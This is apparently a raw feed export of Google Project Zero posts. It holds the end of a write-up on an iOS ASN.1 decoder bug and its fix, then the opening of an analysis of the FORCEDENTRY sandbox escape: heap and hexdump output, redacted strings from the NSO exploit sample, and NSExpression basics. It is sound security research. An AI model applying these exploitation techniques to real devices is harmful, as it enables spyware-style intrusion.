 <p class="c6 c8 c15"><span class="c9">The fix for the bug was simply to revert the change made during the initial import 18 years ago, making the dangerous but unreachable code unreachable once more:</span></p>
 <p class="c0 c15"><span class="c9"></span></p><a id="t.cc85cec956c682ae2159b3e2792de03dfdc37f3c"></a><a id="t.22"></a><table class="c25"><tbody><tr class="c18"><td class="c5" colspan="1" rowspan="1">
 <p class="c6"><span class="c3">&nbsp; &nbsp; </span><span class="c16">if</span><span class="c3">&nbsp;</span><span class="c1">((</span><span class="c3">state</span><span class="c1">-&gt;</span><span class="c3">pending </span><span class="c1">==</span><span class="c3">&nbsp;</span><span class="c11">0</span><span class="c1">)</span><span class="c3">&nbsp;</span><span class="c1 c12">||</span><span class="c3 c12">&nbsp;</span><span class="c1 c12">(</span><span class="c3 c12">state</span><span class="c1 c12">-&gt;</span><span class="c3 c12">contents_length </span><span class="c1 c12">==</span><span class="c3 c12">&nbsp;</span><span class="c11 c12">1</span><span class="c1 c12">)</span><span class="c1">)</span><span class="c3">&nbsp;</span><span class="c1">{</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c16">if</span><span class="c3">&nbsp;</span><span class="c1">(</span><span class="c3">state</span><span class="c1">-&gt;</span><span class="c3">dest </span><span class="c1">!=</span><span class="c3">&nbsp;NULL</span><span class="c1">)</span><span class="c3">&nbsp;</span><span class="c1">{</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c20">SecAsn1Item</span><span class="c3">&nbsp;</span><span class="c1">*</span><span class="c3">item </span><span class="c1">=</span><span class="c3">&nbsp;</span><span class="c1">(</span><span class="c20">SecAsn1Item</span><span class="c3">&nbsp;</span><span class="c1">*)(</span><span class="c3">state</span><span class="c1">-&gt;</span><span class="c3">dest</span><span class="c1">);</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; item</span><span class="c1">-&gt;</span><span class="c20">Data</span><span class="c3">&nbsp;</span><span class="c1">=</span><span class="c3">&nbsp;NULL</span><span class="c1">;</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; item</span><span class="c1">-&gt;</span><span class="c20">Length</span><span class="c3">&nbsp;</span><span class="c1">=</span><span class="c3">&nbsp;</span><span class="c11">0</span><span class="c1">;</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; state</span><span class="c1">-&gt;</span><span class="c3">place </span><span class="c1">=</span><span class="c3">&nbsp;beforeEndOfContents</span><span class="c1">;</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c1">}</span></p>
 <p class="c6"><span class="c3 c12">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c16 c12">if</span><span class="c1 c12">(</span><span class="c3 c12">state</span><span class="c1 c12">-&gt;</span><span class="c3 c12">contents_length </span><span class="c1 c12">==</span><span class="c3 c12">&nbsp;</span><span class="c11 c12">1</span><span class="c1 c12">)</span><span class="c3 c12">&nbsp;</span><span class="c1 c12">{</span></p>
 <p class="c6"><span class="c3 c12">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c23 c12">/* skip over (unused) remainder byte */</span></p>
 <p class="c6"><span class="c3 c12">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c16 c12">return</span><span class="c3 c12">&nbsp;</span><span class="c11 c12">1</span><span class="c1 c12">;</span></p>
 <p class="c6"><span class="c3 c12">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c1 c12">}</span></p>
 <p class="c6"><span class="c3 c12">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c16 c12">else</span><span class="c3 c12">&nbsp;</span><span class="c1 c12">{</span></p>
 <p class="c6"><span class="c3 c12">&nbsp; &nbsp; &nbsp;</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c16">return</span><span class="c3">&nbsp;</span><span class="c11">0</span><span class="c1">;</span></p>
 <p class="c6"><span class="c3 c12">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c1 c12">}</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; </span><span class="c1">}</span></p></td></tr></tbody></table><h2 class="c32 c8 c15" id="h.kac2os93mix4"><span class="c31 c28">Conclusions</span></h2>
 <p class="c6 c8 c15"><span class="c9">Forking complicated code is complicated. In this case it took almost two decades to in the end just revert a change made during import. Even verifying whether this revert is correct is really hard.</span></p>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span class="c9">The Mozilla and Apple codebases have continued to diverge since 2003. As I discovered slightly too late to be useful, the Mozilla code now has more comments trying to explain the decoder&#39;s &quot;novel&quot; memory safety approach.</span></p>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span class="c9">Rewriting this code to be more understandable (and maybe even memory safe) is also distinctly non-trivial. The code doesn&#39;t just implement ASN.1 decoding; it also has to support safely decoding incorrectly encoded data, as described by this verbatim comment for example:</span></p>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span class="c19 c7">&nbsp;/*</span></p>
 <p class="c6 c8 c15"><span class="c19 c7">&nbsp; * Okay, this is a hack. &nbsp;It *should* be an error whether</span></p>
 <p class="c6 c8 c15"><span class="c19 c7">&nbsp; * pending is too big or too small, but it turns out that</span></p>
 <p class="c6 c8 c15"><span class="c19 c7">&nbsp; * we had a bug in our *old* DER encoder that ended up</span></p>
 <p class="c6 c8 c15"><span class="c19 c7">&nbsp; * counting an explicit header twice in the case where</span></p>
 <p class="c6 c8 c15"><span class="c19 c7">&nbsp; * the underlying type was an ANY. &nbsp;So, because we cannot</span></p>
 <p class="c6 c8 c15"><span class="c19 c7">&nbsp; * prevent receiving these (our own certificate server can</span></p>
 <p class="c6 c8 c15"><span class="c19 c7">&nbsp; * send them to us), we need to be lenient and accept them.</span></p>
 <p class="c6 c8 c15"><span class="c19 c7">&nbsp; * To do so, we need to pretend as if we read all of the</span></p>
 <p class="c6 c8 c15"><span class="c19 c7">&nbsp; * bytes that the header said we would find, even though</span></p>
 <p class="c6 c8 c15"><span class="c19 c7">&nbsp; * we actually came up short.</span></p>
 <p class="c6 c8 c15"><span class="c19 c7">&nbsp; */</span></p>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span>Verifying that a rewritten, simpler decoder also handles every hard-coded edge case correctly probably leads to it not being so simple after all.</span></p>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c0 c15"><span class="c9"></span></p>
## link
## -
## @rel
replies
## @type
application/atom+xml
## @href
https://googleprojectzero.blogspot.com/feeds/1033743652169779882/comments/default
## @title
Post Comments
## -
## @rel
replies
## @type
text/html
## @href
https://googleprojectzero.blogspot.com/2022/04/cve-2021-30737-xerubs-2021-ios-asn1.html#comment-form
## @title
0 Comments
## -
## @rel
edit
## @type
application/atom+xml
## @href
https://www.blogger.com/feeds/4838136820032157985/posts/default/1033743652169779882
## -
## @rel
self
## @type
application/atom+xml
## @href
https://www.blogger.com/feeds/4838136820032157985/posts/default/1033743652169779882
## -
## @rel
alternate
## @type
text/html
## @href
https://googleprojectzero.blogspot.com/2022/04/cve-2021-30737-xerubs-2021-ios-asn1.html
## @title
CVE-2021-30737, @xerub's 2021 iOS ASN.1 Vulnerability
## author
## name
Ryan
## uri
http://www.blogger.com/profile/17011901605865574886
## email
noreply@blogger.com
## gd:image
## @rel
http://schemas.google.com/g/2005#thumbnail
## @width
16
## @height
16
## @src
https://img1.blogblog.com/img/b16-rounded.gif
## media:thumbnail
## @xmlns:media
http://search.yahoo.com/mrss/
## @url
https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh3Zm78R4JD6H57okd_d1wpa26R9mX0Q746I5hMzwV8EMxosHbDjO5l5tH2hEpkq0m3S7AMmHOU9_6J7veCrxIxq66ilLSKJCLgHBGalgzSo0MrCulaERSbqUhXkHwqNbZdeVg4JWisV2ZuDb_j_AxLxvzX3t1EEtp396DCTt6fYeihuTRsevnnGUXD/s72-c/image2%20%281%29%281%29.png
## @height
72
## @width
72
## thr:total
0
## -
## id
tag:blogger.com,1999:blog-4838136820032157985.post-1353264177358891846
## published
31/03/2022 13:00:00
## updated
24/08/2022 16:04:44
## title
## @type
text
## #text
FORCEDENTRY: Sandbox Escape
## content
## @type
html
## #text
<style type="text/css">ol{margin:0;padding:0}table td,table th{padding:0}.YDzVciBUld-c8{padding-top:16pt;padding-bottom:4pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.YDzVciBUld-c7{padding-top:18pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.YDzVciBUld-c1{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left;height:11pt}.YDzVciBUld-c16{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:right}.YDzVciBUld-c4{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.YDzVciBUld-c10{color:#434343;text-decoration:none;vertical-align:baseline;font-size:14pt;font-style:normal}.YDzVciBUld-c13{color:#000000;text-decoration:none;vertical-align:baseline;font-size:11pt;font-style:italic}.YDzVciBUld-c9{color:#000000;text-decoration:none;vertical-align:baseline;font-size:16pt;font-style:normal}.YDzVciBUld-c2{color:#000000;text-decoration:none;vertical-align:baseline;font-size:11pt;font-style:normal}.YDzVciBUld-c6{-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline;text-decoration-skip-ink:none}.YDzVciBUld-c17{background-color:#b6d7a8;font-family:"Courier New";font-weight:700}.YDzVciBUld-c15{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.YDzVciBUld-c3{font-weight:400;font-family:"Arial"}.YDzVciBUld-c0{font-weight:400;font-family:"Courier New"}.YDzVciBUld-c11{color:inherit;text-decoration:inherit}.YDzVciBUld-c14{font-style:italic}.YDzVciBUld-c12{text-indent:36pt}.YDzVciBUld-c5{margin-left:36pt}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}</style></head><body class="YDzVciBUld-c15">
 <p class="YDzVciBUld-c4"><span>Posted by Ian Beer &amp; </span><span>Samuel Gro&szlig;</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;of Google Project Zero</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c13 YDzVciBUld-c3">We want to thank Citizen Lab for sharing a sample of the FORCEDENTRY exploit with us, and Apple&rsquo;s Security Engineering and Architecture (SEAR) group for collaborating with us on the technical analysis. Any editorial opinions reflected below are solely Project Zero&rsquo;s and do not necessarily reflect those of the organizations we collaborated with during this research.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>Late last year </span><span class="YDzVciBUld-c6"><a class="YDzVciBUld-c111" href="https://googleprojectzero.blogspot.com/2021/12/a-deep-dive-into-nso-zero-click.html">we published a writeup</a></span><span>&nbsp;of the initial remote code execution stage of FORCEDENTRY, the zero-click iMessage exploit attributed by Citizen Lab to NSO.</span><span>&nbsp;By sending a </span><span class="YDzVciBUld-c0">.gif</span><span>&nbsp;iMessage attachment (which was really a PDF) NSO were able to remotely trigger a heap buffer overflow in the ImageIO JBIG2 decoder. They used that vulnerability to bootstrap a powerful </span><span class="YDzVciBUld-c6"><a class="YDzVciBUld-c111" href="https://en.wikipedia.org/wiki/Weird_machine">weird machine</a></span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;capable of loading the next stage in the infection process: the sandbox escape.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c3">In this post we&#39;ll take a look at that sandbox escape. It&#39;s notable for using only logic bugs. In fact it&#39;s unclear where the features that it uses end and the vulnerabilities which it abuses begin. Both current and upcoming state-of-the-art mitigations such as Pointer Authentication and Memory Tagging have no impact at all on this sandbox escape.</span></p><h2 class="YDzVciBUld-c7" id="h.80ze3m83kn16"><span class="YDzVciBUld-c9 YDzVciBUld-c3">An observation</span></h2>
 <p class="YDzVciBUld-c4"><span>During our initial analysis of the </span><span class="YDzVciBUld-c0">.gif</span><span>&nbsp;file Samuel noticed that rendering the image appeared to leak memory.</span><span>&nbsp;Running the </span><span class="YDzVciBUld-c0">heap</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;tool after releasing all the associated resources gave the following output:</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">$ heap $pid</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">------------------------------------------------------------</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">All zones: 4631 nodes (826336 bytes) &nbsp; &nbsp; &nbsp; &nbsp;</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp;COUNT &nbsp; &nbsp;BYTES &nbsp; &nbsp; AVG &nbsp; CLASS_NAME &nbsp; TYPE &nbsp; BINARY &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp;===== &nbsp; &nbsp;===== &nbsp; &nbsp; === &nbsp; ========== &nbsp; ==== &nbsp; ====== &nbsp; &nbsp; &nbsp; &nbsp;</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; 1969 &nbsp; 469120 &nbsp; 238.3 &nbsp; non-object </span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c0">&nbsp; &nbsp; &nbsp;825 &nbsp; &nbsp;26400 &nbsp; &nbsp;32.0 &nbsp; JBIG2Bitmap &nbsp;C++ &nbsp; CoreGraphics</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c0">heap</span><span>&nbsp;was able to determine that the leaked memory contained </span><span class="YDzVciBUld-c0">JBIG2Bitmap</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;objects.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>Using the </span><span class="YDzVciBUld-c0">-address</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;option we could find all the individual leaked bitmap objects:</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">$ heap -address JBIG2Bitmap $pid</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>and dump them out to files. </span><span class="YDzVciBUld-c2 YDzVciBUld-c3">One of those objects was quite unlike the others:</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">$ hexdump -C dumpXX.bin | head</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c0"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">00000000 &nbsp;62 70 6c 69 73 74 30 30 &nbsp;|bplist00|</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">...</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">00000018 &nbsp; &nbsp; &nbsp; &nbsp;24 76 65 72 73 69 &nbsp;| &nbsp;$versi|</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">00000020 &nbsp;6f 6e 59 24 61 72 63 68 &nbsp;|onY$arch|</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">00000028 &nbsp;69 76 65 72 58 24 6f 62 &nbsp;|iverX$ob|</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">00000030 &nbsp;6a 65 63 74 73 54 24 74 &nbsp;|jectsT$t|</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">00000038 &nbsp;6f 70 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|op &nbsp; &nbsp; &nbsp;|</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">00000040 &nbsp; &nbsp; &nbsp; &nbsp;4e 53 4b 65 79 65 &nbsp;| &nbsp;NSKeye|</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">00000048 &nbsp;64 41 72 63 68 69 76 65 &nbsp;|dArchive|</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>It&#39;s clearly a serialized </span><span class="YDzVciBUld-c6 YDzVciBUld-c0"><a class="YDzVciBUld-c111" href="https://developer.apple.com/documentation/foundation/nskeyedarchiver?language=objc">NSKeyedArchiver</a></span><span>. Definitely not what you&#39;d expect to see in a </span><span class="YDzVciBUld-c0">JBIG2Bitmap</span><span>&nbsp;object. Running </span><span class="YDzVciBUld-c0">strings</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;we see plenty of interesting things (noting that the URL below is redacted):</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4 YDzVciBUld-c5"><span class="YDzVciBUld-c2 YDzVciBUld-c3">Objective-C class and selector names:</span></p>
 <p class="YDzVciBUld-c4 YDzVciBUld-c5"><span class="YDzVciBUld-c2 YDzVciBUld-c0">NSFunctionExpression</span></p>
 <p class="YDzVciBUld-c4 YDzVciBUld-c5"><span class="YDzVciBUld-c2 YDzVciBUld-c0">NSConstantValueExpression</span></p>
 <p class="YDzVciBUld-c4 YDzVciBUld-c5"><span class="YDzVciBUld-c2 YDzVciBUld-c0">NSConstantValue</span></p>
 <p class="YDzVciBUld-c4 YDzVciBUld-c5"><span class="YDzVciBUld-c2 YDzVciBUld-c0">expressionValueWithObject:context:</span></p>
 <p class="YDzVciBUld-c4 YDzVciBUld-c5"><span class="YDzVciBUld-c2 YDzVciBUld-c0">filteredArrayUsingPredicate:</span></p>
 <p class="YDzVciBUld-c4 YDzVciBUld-c5"><span class="YDzVciBUld-c2 YDzVciBUld-c0">_web_removeFileOnlyAtPath:</span></p>
 <p class="YDzVciBUld-c4 YDzVciBUld-c5"><span class="YDzVciBUld-c2 YDzVciBUld-c0">context:evaluateMobileSubscriberIdentity:</span></p>
 <p class="YDzVciBUld-c4 YDzVciBUld-c5"><span class="YDzVciBUld-c2 YDzVciBUld-c0">performSelectorOnMainThread:withObject:waitUntilDone:</span></p>
 <p class="YDzVciBUld-c4 YDzVciBUld-c5"><span class="YDzVciBUld-c2 YDzVciBUld-c3">...</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4 YDzVciBUld-c5"><span class="YDzVciBUld-c2 YDzVciBUld-c3">The name of the file which delivered the exploit:</span></p>
 <p class="YDzVciBUld-c4 YDzVciBUld-c5"><span class="YDzVciBUld-c2 YDzVciBUld-c0">XXX.gif</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4 YDzVciBUld-c5"><span class="YDzVciBUld-c2 YDzVciBUld-c3">Filesystems paths:</span></p>
 <p class="YDzVciBUld-c4 YDzVciBUld-c5"><span class="YDzVciBUld-c2 YDzVciBUld-c0">/tmp/com.apple.messages</span></p>
 <p class="YDzVciBUld-c4 YDzVciBUld-c5"><span class="YDzVciBUld-c2 YDzVciBUld-c0">/System/Library/PrivateFrameworks/SlideshowKit.framework/Frameworks/OpusFoundation.framework</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4 YDzVciBUld-c5"><span class="YDzVciBUld-c2 YDzVciBUld-c3">a URL:</span></p>
 <p class="YDzVciBUld-c4 YDzVciBUld-c5"><span class="YDzVciBUld-c2 YDzVciBUld-c0">https://XXX.cloudfront.net/YYY/ZZZ/megalodon?AAA</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>Using </span><span class="YDzVciBUld-c0">plutil</span><span>&nbsp;we can convert the </span><span class="YDzVciBUld-c0">bplist00</span><span>&nbsp;binary format to XML. Performing some post-processing and cleanup we can see that the top-level object in the </span><span class="YDzVciBUld-c0">NSKeyedArchiver</span><span>&nbsp;is a serialized </span><span class="YDzVciBUld-c0">NSFunctionExpression</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;object.</span></p><h2 class="YDzVciBUld-c7" id="h.1ai2h2r4yshv"><span class="YDzVciBUld-c9 YDzVciBUld-c3">NSExpression NSPredicate NSExpression</span></h2>
 <p class="YDzVciBUld-c4"><span>If you&#39;ve ever used Core Data or tried to filter a Objective-C collection you might have come across </span><span class="YDzVciBUld-c0">NSPredicates</span><span>. </span><span class="YDzVciBUld-c6"><a class="YDzVciBUld-c111" href="https://developer.apple.com/documentation/foundation/nspredicate?language=objc">According to Apple&#39;s public documentation</a></span><span>&nbsp;they are used </span><span>&quot;</span><span class="YDzVciBUld-c14">to define logical conditions for constraining a search for a fetch or for in-memory filtering</span><span>&quot;</span><span class="YDzVciBUld-c13 YDzVciBUld-c3">.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>For example, in Objective-C you could filter an </span><span class="YDzVciBUld-c0">NSArray</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;object like this:</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; NSArray* names = @[@&quot;one&quot;, @&quot;two&quot;, @&quot;three&quot;];</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c0"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; NSPredicate* pred;</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; pred = [NSPredicate predicateWithFormat:</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; @&quot;</span><span class="YDzVciBUld-c17">SELF beginswith[c] &#39;t&#39;</span><span class="YDzVciBUld-c2 YDzVciBUld-c0">&quot;];</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c0"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; NSLog(@&quot;%@&quot;, [names filteredArrayUsingPredicate:pred]);</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>The predicate is &quot;</span><span class="YDzVciBUld-c0">SELF beginswith[c] &#39;t&#39;&quot;</span><span>. This prints an </span><span class="YDzVciBUld-c0">NSArray</span><span>&nbsp;containing only &quot;</span><span class="YDzVciBUld-c0">two</span><span>&quot; and &quot;</span><span class="YDzVciBUld-c0">three</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&quot;.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c0">[NSPredicate predicateWithFormat]</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;builds a predicate object by parsing a small query language, a little like an SQL query. </span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c0">NSPredicates</span><span>&nbsp;can be built up from </span><span class="YDzVciBUld-c0">NSExpressions</span><span>, connected by </span><span class="YDzVciBUld-c0">NSComparisonPredicates</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;(like less-than, greater-than and so on.)</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c0">NSExpressions</span><span>&nbsp;themselves can be fairly complex, containing aggregate expressions (like &quot;</span><span class="YDzVciBUld-c0">IN</span><span>&quot; and &quot;</span><span class="YDzVciBUld-c0">CONTAINS</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&quot;), subqueries, set expressions, and, most interestingly, function expressions.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>Prior to 2007 (in OS X 10.4 and below) function expressions were limited to just the following five extra built-in methods: </span><span class="YDzVciBUld-c0">sum</span><span>, </span><span class="YDzVciBUld-c0">count</span><span>, </span><span class="YDzVciBUld-c0">min</span><span>, </span><span class="YDzVciBUld-c0">max</span><span>, and </span><span class="YDzVciBUld-c0">average</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>But starting in OS X 10.5 (which would also be around the launch of iOS in 2007) </span><span class="YDzVciBUld-c0">NSFunctionExpressions</span><span>&nbsp;were extended</span><span>&nbsp;</span><span class="YDzVciBUld-c6"><a class="YDzVciBUld-c111" href="https://developer.apple.com/documentation/foundation/nsexpression">to allow </a></span><span class="YDzVciBUld-c6 YDzVciBUld-c14"><a class="YDzVciBUld-c111" href="https://developer.apple.com/documentation/foundation/nsexpression">arbitrary</a></span><span class="YDzVciBUld-c6"><a class="YDzVciBUld-c111" href="https://developer.apple.com/documentation/foundation/nsexpression">&nbsp;method invocations</a></span><span>&nbsp;with the </span><span class="YDzVciBUld-c0">FUNCTION</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;keyword:</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &quot;FUNCTION(&#39;abc&#39;, &#39;stringByAppendingString&#39;, &#39;def&#39;)&quot; =&gt; @&quot;abcdef&quot;</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
